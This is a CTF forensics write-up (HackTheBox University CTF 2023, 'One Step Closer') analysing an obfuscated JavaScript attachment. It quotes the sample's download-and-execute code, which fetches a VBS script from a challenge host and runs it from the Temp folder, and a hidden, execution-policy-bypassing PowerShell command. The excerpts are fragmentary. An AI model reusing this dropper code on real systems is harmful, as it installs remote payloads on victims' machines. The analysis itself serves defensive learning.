HackTheBox University CTF 2023 - One Step Closer

October 17, 2023 - 7 mins read
  • writeup
  • dfir

The first forensics challenge of HackTheBox Uni CTF challenged participants to analyze a malicious JavaScript attachment that lead to VBS and PowerShell execution.

Background

The challenge description was as follows: Tasked with defending the antidote’s research, a diverse group of students united against a relentless cyber onslaught. As codes clashed and defenses were tested, their collective effort stood as humanity’s beacon, inching closer to safeguarding the research for the cure with every thwarted attack. A stealthy attack might have penetrated their defenses. Along with the Hackster’s University students, analyze the provided file so you can detect this attack in the future.

Initial Access

The challenge provided a zip file, which when decompressed revealed a single JavaScript file called vaccine.js. The file contained three obfuscated sections of code - two functions and a few lines of code in the main body of the file. Before analyzing the functions, I searched for the function names in the rest of the code, and realized they were never called. Because of this, I decided to focus on reversing the main body of the file first.

var msxml_object = new ActiveXObject("MSXML2.XMLHTTP.6.0");

var temp_dir = 'C:\\Windows\\Temp';
var vbs_script_file = scripting_filesystem_object.GetTempName() + ".vbs"; 
var path_to_vbs_script = scripting_filesystem_object.BuildPath(temp_dir, vbs_script_file);

    var scriptText = msxml_object.responseText;
    var vbs_text_file = scripting_filesystem_object.CreateTextFile(path_to_vbs_script, true);
    vbs_text_file.write(scriptText);
    vbs_text_file.close();
    var vbs_execution_status = wscript_shell.Exec('wscript "' + path_to_vbs_script + '"');
    while (vbs_execution_status.Status === 0) {

    scripting_filesystem_object.DeleteFile(path_to_vbs_script);

} else {
    WScript.Echo("Fatal: " + msxml_object.status);
}

The code downloads a VBS script from http://infected.human.htb/d/BKtQR, saves it to a temporary file, and executes it. To continue the analysis, I used cURL to manually download the VBS script without executing it, and saved it to a file called htb_infected.vbs.

PowerShell Rev Part 2

This PowerShell script is also obfuscated, and consists of a single incredibly long line of code. Rather than trying to rename all of the variables in this script, let’s look at the end of the script again to see if the same trick of modifying an execute to a print statement will work.

$OWjuxd = [system.Text.encoding]::Unicode.GetString([system.Convert]::Frombase64string($codigo.replace(''em9tYmllc'',''A'')));powershell.exe -windowstyle hidden -executionpolicy bypass -NoProfile -command $OWjuxD' 0 0

Excellent, that should work! This script is executing another PowerShell script, which is stored in the variable $OWjuxd. Let’s modify the script to print the contents of the variable, rather than executing it:

$OWjuxd = [system.Text.encoding]::Unicode.GetString([system.Convert]::Frombase64string($codigo.replace(''em9tYmllc'',''A''))) > outagain.txt'

Now, when we run the script, we get another obfuscated PowerShell script printed to a text file.
